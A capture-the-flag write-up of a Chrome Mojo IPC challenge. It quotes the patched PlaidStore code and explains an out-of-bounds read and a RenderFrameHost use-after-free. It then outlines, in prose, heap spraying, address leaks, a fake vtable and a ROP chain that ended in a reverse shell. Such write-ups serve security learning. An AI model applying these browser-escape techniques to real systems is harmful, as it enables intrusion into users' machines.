I ended up solving this challenge for plaid this year and thought it would make for an interesting blog post since it was one of the higher point challenges and dealt with chrome ipc. They give us their server setup, a custom built chrome binary, javascript bindings for mojo, and a diff for the chrome version in the challenge description. I was able to solve this challenge just by looking at the diff and using the provided chrome binary; since the binary came built with symbols. The nice thing about this challenge was that you didn't really need to know any heap spraying primitives to exploit it either; although they helped with exploiting the challenge.

## The Patch

The patch added a `PlaidStore` interface to the `InterfaceBroker` of the browser.  As an aside; recently chrome moved almost all their frame interfaces away from the `InterfaceProvider` and into the `InterfaceBroker` which is where this interface is added to. We also see two methods associated with the interface defined as:

```idl
StoreData(string key, array<uint8> data);
GetData(string key, uint32 count) => (array<uint8> data);
```

## The Bugs

The first bug is pretty obvious; in `GetData`, a renderer can request an arbitrary amount of data starting from the beginning of a vector. 

```cpp
void PlaidStoreImpl::GetData(
  const std::string &key,
  uint32_t count,
  GetDataCallback callback) {
...
  /* Renderer can request an arbitrary sized amount of data to be returned */
  std::vector<uint8_t> result(it->second.begin(), it->second.begin() + count);
  std::move(callback).Run(result);
}
```

The second bug is a bit more subtle since it requires understanding the lifetime of a `RenderFrameHost`. In both methods, we see calls to check if the `RenderFrameHost` the interface is associated with is still alive by calling `IsRenderFrameLive`. However, the pointer to the `RenderFrameHost` is actually a raw pointer that is stored as a data member of the interface. Normally, an interface should _never_ store a pointer to a `RenderFrameHost` if the interface isn't actually owned by the `RenderFrameHost`.  Instead, a frame id should be stored and the `RenderFrameHost` should be retrieved via a call to `RenderFrameHost::FromID(int render_process_id, int render_frame_id)`. The mojo interface itself is also a `StrongBinding` created via `mojo::MakeSelfOwnedReceiver` which means it owns itself and is only ever destructed if the interface is closed or if a communication error occurred. This gives us a use-after-free condition when the `RenderFrameHost` is killed and `render_frame_host_` is accessed. We also see that `IsRenderFrameLive` is a virtual method that is [overridden](https://source.chromium.org/chromium/chromium/src/+/master:content/browser/frame_host/render_frame_host_impl.h;l=313). This gives us `pc` control through a fake vtable method for `IsRenderFrameLive`.

## Triggering the Bugs

The oob read is easy to trigger but the uaf is somewhat a bit more contrived. We need to create, a `RenderFrameHost` and with the `RenderFrameHost` bind a `PlaidStore` interface so that the raw pointer gets stored. Then kill the `RenderFrameHost` and call a `PlaidStore` method to get `IsRenderFrameAlive` called. 

Every web page open in chrome has a `RenderFrameHost` associated with it, but there is a case where a web page can have child frames and this occurs when we have `iframes`. We can also see all the `RenderFrameHosts` that a web page has by navigating to `chrome://process-internals`. 

![Process Internals](/assets/img/fatalbit/mojo-process-internals.png)

*The two numbers associated with each frame is the process_id and frame_id respectively.*

Knowing this, we can bind the `PlaidStore` interface from within the `iframe` and then kill the `iframe` from a parent frame. This allows use to continue execution on the parent frame after killing off our main script located in the `iframe`. The only problem is that there a slight window where the `RenderFrameHost` is killed and the `PlaidStoreImpl` object is still alive. So from the parent frame I place javascript that continues to run and retries the uaf over and over until it lands. I use a `postMessage` from the `iframe` to tell the parent frame that all the necessary setup is done and it's time to kill the `iframe`. 

## Putting It Together

To figure out the size of the `RenderFrameHost`, I used gdb and broke on one of the `PlaidStore` methods and called `malloc_usable_size` on the address of the `render_frame_host` which revealed that the `RenderFrameHostImpl`(the actual derived class that the base class points to) is of size 0xd00.

In order to get our leaks working as well as get our memory allocated in the right place, I use the fact that `array<uint8>`s defined in mojom files get translated as `vector<uint8_t>`s in c++ when the mojom gets auto-generated and compiled into chrome. This means that data that is sent over the interface is deserialized and held in a `std::vector` which has a backing store size that we specify and data that we control. The lifetime of the vectors are also kept alive for as long as the `PlaidStoreImpl` object is alive by storing them in the `std::map`, `data_store_`.

I used the oob leak to leak two things:

1. Base address of chrome
2. Address of the `RenderFrameHostImpl`

I did this in two separate steps but it could have been done in one by scanning for the `vtable` of the `PlaidStoreImpl` and then reading the `render_frame_host`. To leak the base address of chrome, I scanned for a vtable leak with some heuristics for a `MessagePipeDispatcher::PortObserverThunk`. This object is of size 0x10 and easily sprayed by creating a bunch of `PlaidStore` interfaces and making holes so our `std::vector` allocates into the spray. With the base address of chrome, I scanned for the vtable of a `PlaidStoreImpl` then obtained the `render_frame_host` raw pointer that it stores as a data member for a heap leak. When we trigger the uaf, and we've taken up the heap allocation, our payload address will be the same address as this `render_frame_host` pointer; any `PlaidStore`s bound from the same frame will point to the same `RenderFrameHost`. Then I point the vtable method of `IsRenderFrameAlive` , inside my payload and do my stack pivot and ropchain to get code execution.

## Final Notes

The exploit usually lands within 20 seconds in a normal chrome environment; in fact it pop almost immediately every time. But for _some_ reason the reliability tanks when chrome is run with `--headless`; possibly due to performance degradation. Even with `--disable-gpu`, headless seems to just run way slower than regular chrome. I ended up buffering my commands in the reverse shell and queuing a bunch requests to the server, then checking if the flag printed. The challenge also took a single web page so I just hosted my exploit on my own server and sent them a web page that redirected to my server.

After the CTF, I also found out that this challenge was based off of this [commit](https://source.chromium.org/chromium/chromium/src/+/master:content/browser/installedapp/installed_app_provider_impl.cc;l=50;drc=d37dc2558a7c841c8439f0cae4dfa5807e56f61e) and that there were ways could pass the `MojoHandle` to the parent frame to keep the interface alive in a more reliable way than waiting for UAF window after killing the `iframe`.
